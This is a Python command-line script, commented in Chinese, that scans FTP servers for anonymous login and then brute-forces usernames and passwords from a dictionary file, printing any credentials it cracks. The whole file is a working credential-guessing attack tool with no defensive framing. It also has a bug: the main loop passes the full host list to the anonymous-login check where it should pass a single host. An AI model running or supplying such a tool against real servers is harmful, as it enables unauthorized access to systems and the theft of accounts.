#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from ftplib import *
import argparse
import time

#匿名登录扫描
def anonScan(hostname):				#参数是主机名
	try:
		with FTP(hostname) as ftp:	#创建FTP对象
			ftp.login()				#FTP匿名登录
			print('\n[*] ' + str(hostname) + " FTP Anonymous login successful!") 	#没有抛出异常则登录成功
			return True
	except Exception as e:					#抛出异常则登录失败
		print('\n[]' + str(hostname) + " FTP  Anonymous logon failure!")
		return False


#尝试登录
def vlcLogin(hostname, pwdFile):					
	try:
		with open(pwdFile, 'r') as pf:				#打开字典文件
			for line in pf.readlines():			#循环读取每一行
				time.sleep(1)
				userName = line.split(':')[0]		#从读取的内容中取出用户名
				passWord = line.split(':')[1].strip('\r').strip('\n')		#从读取的内容中取出密码
				print('[+] Trying: ' + userName + ':' + passWord)
				try:
					with FTP(hostname) as ftp: 		#以主机名为参数构造FTP对象
						ftp.login(userName, passWord)	#使用读取的用户名密码登录FTP服务器

						#如果没有异常则表示登录成功，打印主机名、用户名和密码
						print('\n[+] ' +str(hostname) + 'FTP login successful: '+ userName + ':' + passWord)
						return (userName, passWord)
				except Exception as e:
					#产生异常则失败，尝试其他用户名
					pass
	except IOError as e:
		print('Error: the password file does not exist!')
	print('\n[-] Cannot crackthe FTP password, please change the password dictionary try again!')
	return (None, None)


def main():
	#命令解析
	#用描述创建了ArgumentParser对象
	parser =argparse.ArgumentParser(description='FTP Scanner')
	#添加-H 命令，dest表示解析时获取-H参数后面值的变量名，help表示帮助信息
	parser.add_argument('-H', dest='hostName', help='The host list with ","space')
	parser.add_argument('-f',dest='pwdFile', help='Password dictionary file')
	options = None
	try:
		options= parser.parse_args()
	except:
		print(parser.parse_args(['-h']))
		exit(0)

	hostNames = str(options.hostName).split(',')
	pwdFile = options.pwdFile
	if hostNames== ['None']:
		print(parser.parse_args(['-h']))
		exit(0)

	for hostName in hostNames:
		username = None
		password = None
		if anonScan(hostNames) == True:
			print('Host: ' + hostName + ' Can anonymously!')
		elif pwdFile != None:
			(username, password) = vlcLogin(hostName, pwdFile)
			if password != None:
				print('\n[+] Host: ' + hostName + ' Username: ' + username + 'Password: ' + password)

	print('\n[*]--------------Scan End!---------------[*]')

if __name__ == '__main__':
	main()

				 
